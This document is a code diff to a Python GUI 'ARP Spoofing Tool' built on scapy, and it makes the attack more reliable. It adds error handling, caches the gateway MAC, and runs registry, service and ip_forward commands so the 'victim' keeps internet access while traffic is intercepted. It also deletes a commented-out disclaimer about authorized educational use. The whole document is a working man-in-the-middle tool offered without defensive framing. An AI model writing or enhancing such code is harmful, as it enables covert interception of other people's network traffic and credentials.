@@ -2,6 +2,7 @@ import customtkinter as ctk
 import scapy.all as scapy
 import threading
 import time
+import os
 from typing import Optional
 
 class ScapyWrapper:
@@ -10,20 +11,31 @@ class ScapyWrapper:
         
     def get_mac(self, ip: str) -> Optional[str]:
         """Get MAC address for given IP."""
-        arp_request = scapy.ARP(pdst=ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast/arp_request
-        
         try:
+            # Validate IP address format
+            import socket
+            socket.inet_aton(ip)  # This will raise an exception for invalid IPs
+            
+            arp_request = scapy.ARP(pdst=ip)
+            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast/arp_request
+            
             answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-            return answered_list[0][1].hwsrc
-        except IndexError:
+            if answered_list:
+                return answered_list[0][1].hwsrc
+            return None
+        except Exception as e:
+            print(f"Error getting MAC address for {ip}: {e}")
             return None
             
     def send_arp_packet(self, target_ip: str, spoof_ip: str, target_mac: str):
         """Send ARP packet to target."""
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
+        try:
+            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+            scapy.send(packet, verbose=False)
+            self.sent_packets_count += 1
+        except Exception as e:
+            print(f"Error sending ARP packet to {target_ip}: {e}")
         
     def restore_arp(self, destination_ip: str, source_ip: str):
         """Restore ARP tables to normal state."""
@@ -59,6 +71,21 @@ class NetworkManager:
         self.gateway_ip = gateway_ip
         self.spoofing_active = True
         
+        # Try to enable IP forwarding but continue if it fails
+        try:
+            if os.name == 'nt':  # Windows
+                # Enable IP forwarding in registry
+                os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
+                
+                # Try to start and configure the Remote Access service
+                os.system("sc config RemoteAccess start= auto")
+                os.system("net start RemoteAccess")
+            else:  # Linux
+                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        except Exception as e:
+            print(f"Warning: Could not enable IP forwarding: {e}")
+            print("The victim's internet access will be disrupted.")
+        
         target_mac = self.scapy_wrapper.get_mac(target_ip)
         if not target_mac:
             raise ValueError(f"Could not get MAC address for target {target_ip}")
@@ -67,17 +94,35 @@ class NetworkManager:
         
     def _spoof_loop(self, target_ip: str, gateway_ip: str, target_mac: str):
         """Main spoofing loop."""
+        gateway_mac = self.scapy_wrapper.get_mac(gateway_ip)
+        if not gateway_mac:
+            print(f"Warning: Could not get MAC address for gateway {gateway_ip}")
+            print("ARP spoofing may not work correctly.")
+        
         while self.spoofing_active:
-            # Send ARP packets to both target and gateway
-            self.scapy_wrapper.send_arp_packet(target_ip, gateway_ip, target_mac)
-            self.scapy_wrapper.send_arp_packet(gateway_ip, target_ip, 
-                                             self.scapy_wrapper.get_mac(gateway_ip))
-            time.sleep(2)
+            try:
+                # Send ARP packets to both target and gateway
+                self.scapy_wrapper.send_arp_packet(target_ip, gateway_ip, target_mac)
+                if gateway_mac:
+                    self.scapy_wrapper.send_arp_packet(gateway_ip, target_ip, gateway_mac)
+                time.sleep(2)
+            except Exception as e:
+                print(f"Error in spoofing loop: {e}")
+                time.sleep(2)  # Continue trying
             
     def stop_spoofing(self):
         """Stop ARP spoofing attack and restore ARP tables."""
         if self.spoofing_active:
             self.spoofing_active = False
+            
+            # Disable IP forwarding
+            if os.name == 'nt':  # Windows
+                os.system("reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
+                # Restart routing service
+                os.system("net stop RemoteAccess & net start RemoteAccess")
+            else:  # Linux
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            
             # Restore ARP tables automatically when stopping
             try:
                 self.scapy_wrapper.restore_arp(self.target_ip, self.gateway_ip)
@@ -105,6 +150,11 @@ class GUIController:
         self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="e.g., 192.168.1.1")
         self.gateway_entry.grid(row=1, column=1, padx=5, pady=5)
         
+        # Add note about admin privileges
+        admin_note = "Note: For full functionality (to maintain victim's internet access), run as administrator."
+        ctk.CTkLabel(input_frame, text=admin_note, wraplength=350, 
+                   text_color="gray", font=("Helvetica", 9)).grid(row=2, column=0, columnspan=2, padx=5, pady=5)
+        
         # Control Frame
         control_frame = ctk.CTkFrame(self.app.root)
         control_frame.pack(padx=10, pady=5)
@@ -124,11 +174,7 @@ class GUIController:
         self.status_text = ctk.CTkTextbox(status_frame, height=10, width=50)
         self.status_text.pack(padx=5, pady=5, fill="both", expand=True)
         
-        # # Add a disclaimer
-        # disclaimer = "DISCLAIMER: This tool is for educational purposes only. Use responsibly and only on networks you own or have permission to test."
-        # disclaimer_label = ctk.CTkLabel(self.app.root, text=disclaimer, 
-        #                              font=("Helvetica", 10), text_color="gray")
-        # disclaimer_label.pack(pady=5)
+        
         
     def start_spoofing(self):
         """Handle start spoofing button click."""
@@ -159,20 +205,27 @@ class GUIController:
         self.status_text.configure(state="disabled")
 
 class ARP_SpoofingApp:
-    def __init__(self):
-        self.root = ctk.CTk()
-        self.root.title("ARP Spoofing Tool")
+    def __init__(self, root=None):
+        # Allow passing an external root window
+        if root is None:
+            self.root = ctk.CTk()
+            self.root.title("ARP Spoofing Tool")
+        else:
+            self.root = root
+            
         self.network_manager = NetworkManager()
         
     def setup_gui(self):
         """Setup main application window."""
-        self.root.geometry("500x400")
+        if isinstance(self.root, ctk.CTk):  # Only set geometry if it's our own window
+            self.root.geometry("500x400")
         self.gui_controller = GUIController(self)
         
     def run(self):
         """Run the application."""
         self.setup_gui()
-        self.root.mainloop()
+        if isinstance(self.root, ctk.CTk):  # Only call mainloop if it's our own window
+            self.root.mainloop()
 
 if __name__ == "__main__":
     app = ARP_SpoofingApp()
